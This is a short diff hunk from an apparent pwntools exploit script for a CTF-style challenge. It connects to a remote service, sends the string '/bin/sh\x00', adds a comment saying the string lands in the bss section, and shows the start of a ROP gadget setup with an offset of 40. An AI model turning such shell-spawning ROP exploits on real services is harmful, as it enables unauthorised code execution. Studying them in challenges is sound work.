@@ -6,7 +6,7 @@ PORT = 10306
 s = remote(HOST, PORT)
 
 s.recvuntil(b">")
-s.send(b"/bin/sh\x00")
+s.send(b"/bin/sh\x00") # the program write directly in the bss section, so we can write the string "/bin/sh" directly
 
 # Gadget ROP
 offset = 40                  
